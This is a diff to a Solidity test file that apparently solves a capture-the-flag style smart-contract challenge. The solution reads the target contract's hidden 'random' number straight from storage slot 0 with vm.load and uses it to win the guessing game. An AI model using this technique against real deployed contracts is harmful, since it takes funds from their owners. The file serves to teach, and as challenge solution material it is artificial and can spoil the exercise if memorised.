@@ -21,8 +21,9 @@ contract GuessRandomNumberTest is Test {
 
         // Place your solution here
         guessRandomNumber = (new GuessRandomNumber){value: 1 ether}();
-        exploitContract = new ExploitContract();
-        uint8 guess = exploitContract.Exploit();
+        uint8 guess = uint8( uint256( vm.load(address(guessRandomNumber), 0) ) );
+        // exploitContract = new ExploitContract();
+        // uint8 guess = exploitContract.Exploit();
         guessRandomNumber.guess{value: 1 ether}(guess);
 
         _checkSolved();
